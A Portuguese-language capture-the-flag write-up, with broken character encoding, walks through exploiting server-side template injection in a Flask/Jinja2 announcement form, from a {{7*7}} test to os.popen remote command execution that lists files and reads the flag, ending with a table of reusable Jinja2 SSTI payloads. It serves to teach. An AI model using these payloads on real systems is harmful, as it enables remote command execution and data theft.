ğŸ“ Categoria:

Web Exploitation

### ğŸ¯ Objetivo:

Descobrir a flag explorando vulnerabilidades na aplicaÃ§Ã£o web.

## ğŸ§© Etapas do processo de exploraÃ§Ã£o

### 1. ğŸ•µï¸ Reconhecimento inicial

- A aplicaÃ§Ã£o web disponibiliza um formulÃ¡rio para o usuÃ¡rio **"anunciar" qualquer coisa**.
- Ao submeter o formulÃ¡rio, o conteÃºdo Ã© enviado via mÃ©todo **POST** para a URL `/`.
- A aplicaÃ§Ã£o entÃ£o redireciona para a rota `/announce`, exibindo o conteÃºdo enviado.

### HTML analisado:

```html
html

<form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
</form>

```

### ObservaÃ§Ãµes:

- A aplicaÃ§Ã£o permite inserir HTML bÃ¡sico (ex: `<h1>olÃ¡</h1>`), e inicialmente parecia vulnerÃ¡vel a XSS.
- Utilizei o webhook.site, considerando que poderia ser uma vulnerabilidade XSS, forÃ§ando alguns scripts para exploraÃ§Ã£o Via XSS Ã  fim de captar algum bot acessando e captar algum cookie de repente de administrador ou algo do gÃªnero, porÃ©m nenhum bot foi detectado visitando os anÃºncios, descartando a exploraÃ§Ã£o via XSS com payloads como `<script>`.

### 2. ğŸ“Œ Descoberta crucial: indÃ­cio de SSTI

Ao observar o `<title>` da pÃ¡gina:

```html
html

<title>SSTI1</title>

```

Foi identificada uma forte pista de que o desafio envolvia **SSTI (Server-Side Template Injection)**.

**Server-Side Template Injection (SSTI)** Ã© uma vulnerabilidade que ocorre quando um servidor web injeta dados do usuÃ¡rio diretamente em um **template engine** (motor de templates) sem a devida validaÃ§Ã£o ou sanitizaÃ§Ã£o.

### ğŸ“Œ Em resumo:

> SSTI permite que um invasor injete cÃ³digo malicioso em um sistema de template do lado do servidor, fazendo com que o servidor execute esse cÃ³digo.
> 

### 3. ğŸ§ª Teste de SSTI

### Payload usado:

```
jinja

{{7*7}}

```

### Resultado:

A pÃ¡gina retornou o valor `49`, confirmando que a entrada do usuÃ¡rio estava sendo interpretada como template do lado do servidor (provavelmente **Jinja2**, usado com Flask em Python).

### 4. ğŸ’£ ExecuÃ§Ã£o remota de comandos (RCE) via SSTI

ApÃ³s confirmaÃ§Ã£o de SSTI, foi testado um payload para executar comandos shell no servidor:

### Payload:

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

```

### ğŸš€ Explicando o cÃ³digo passo a passo:

### 1. `config`

- Ã‰ uma **variÃ¡vel preexistente** no contexto do Flask/Jinja2, frequentemente disponÃ­vel.
- Ela representa a configuraÃ§Ã£o da aplicaÃ§Ã£o (`flask.config.Config`).

### 2. `.__class__`

- Pega a **classe** da variÃ¡vel `config`, que Ã© `Config`.

### 3. `.__init__`

- Acessa o mÃ©todo **construtor** da classe `Config`.

### 4. `.__globals__`

- Aqui Ã© onde a mÃ¡gica acontece:
    - Em Python, mÃ©todos como `__init__` sÃ£o **funÃ§Ãµes**.
    - FunÃ§Ãµes possuem um dicionÃ¡rio chamado `__globals__`, que contÃ©m todas as **variÃ¡veis globais do arquivo onde a funÃ§Ã£o foi definida**.
    - Ou seja, vocÃª ganha acesso a **todo o escopo global do arquivo Python**, incluindo **mÃ³dulos importados**, como o `os`.

### 5. `['os']`

- Acessa o mÃ³dulo `os` importado no escopo global.

### 6. `.popen('ls')`

- `popen()` Ã© uma funÃ§Ã£o do mÃ³dulo `os` que executa um **comando no sistema** e retorna um objeto semelhante a um arquivo.

### 7. `.read()`

- LÃª e retorna o **output** do comando `ls`.

### ğŸ’£ Resultado prÃ¡tico

Se o servidor processar isso, ele executarÃ¡:

```bash
bash
CopiarEditar
ls

```

### Resultado do cÃ³digo shell:

```
markdown

__pycache__ app.py flag requirements.txt

```

> ConfirmaÃ§Ã£o de que comandos shell estavam sendo executados via SSTI.
> 

### 5. ğŸ Leitura da flag

Com o conhecimento da existÃªncia do arquivo `flag` ou `flag.txt`, foi utilizado o seguinte payload:

### Payload final:

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

```

ou

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

```

### Resultado:

A flag foi retornada diretamente no corpo da resposta. ğŸ†

## âœ… ConclusÃ£o

- A aplicaÃ§Ã£o estava vulnerÃ¡vel a **SSTI**.
- Foi possÃ­vel escalar a injeÃ§Ã£o atÃ© **execuÃ§Ã£o remota de comandos (RCE)**.
- A flag foi extraÃ­da com sucesso utilizando comandos shell via `os.popen`.

## ğŸ” ReferÃªncia de Payloads Ãºteis para Jinja2 SSTI:

| Objetivo | Payload |
| --- | --- |
| Teste SSTI | `{{7*7}}` |
| Listar arquivos | `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` |
| Ler conteÃºdo de arquivo | `{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}` |
| Executar comandos arbitrÃ¡rios | Substituir `'cat flag'` por qualquer outro comando shell vÃ¡lido |
